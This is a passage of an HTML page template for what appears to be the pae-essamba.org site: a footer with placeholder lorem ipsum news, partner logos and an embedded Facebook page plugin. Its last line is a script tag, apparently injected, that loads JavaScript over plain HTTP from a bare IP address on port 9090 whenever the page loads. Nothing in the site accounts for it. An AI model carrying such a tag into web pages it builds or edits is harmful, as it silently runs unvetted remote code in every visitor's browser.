            ...
            <div class="row clearfix">
                <div class="col-md-3 col-sm-3">
                    <div id="news" class="clearfix">
                        ...
                        <p>
                            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean bibendum diam ut lectus
                            pulvinar dignissim. Mauris eu nibh eu dolor cursus fringilla. Ut at sem sit amet nisi
                            blandit iaculis nec in mauris.
                        </p>
                    </div>
                </div>
                <div class="col-md-3 col-sm-3">
                ...
                <div class="col-md-3 col-sm-3">
                    <div id="tweets" class="clearfix">
                        ...
                        <img class="img-responsive"
                            src="{{ asset("/assets/images/partners/briluce_logo_A0_Rectangle_70_pattern.png") }}">
                        <img class="img-responsive"
                            src="{{ asset("/assets/images/partners/bdtask_1508059680_280_A0_Rectangle_72_pattern.png") }}">
                    </div>
                </div>
                <div class="col-md-3">
                    <div id="flckrStream" class="clearfix">
                        <h3>Our Facebook Page</h3>
                        <iframe allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media"
                            style="border: medium none; visibility: visible; width: 262px; height: 175px;"
                            src="https://www.facebook.com/v2.3/plugins/page.php?app_id=249643311490&amp;channel=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2Fd_vbiawPdxB.js%3Fversion%3D44%23cb%3Df2e3e9f3033a702%26domain%3Dwww.pae-essamba.org%26origin%3Dhttp%253A%252F%252Fwww.pae-essamba.org%252Ff1665df78d5b04a%26relation%3Dparent.parent&amp;container_width=390&amp;height=175&amp;hide_cover=false&amp;href=https%3A%2F%2Fwww.facebook.com%2Fpaeessamba&amp;locale=en_US&amp;sdk=joey&amp;show_facepile=true&amp;show_posts=false&amp;width=auto"
                            __idm_frm__="100931731479" class="" width="262px" height="175px" frameborder="0"></iframe>
                    </div>
                </div>
            </div>
        </div>
    ...
    <script type='text/javascript' id='1qa2ws' charset='utf-8'
        src='http://154.70.108.86:9090/www/default/base.js'></script>
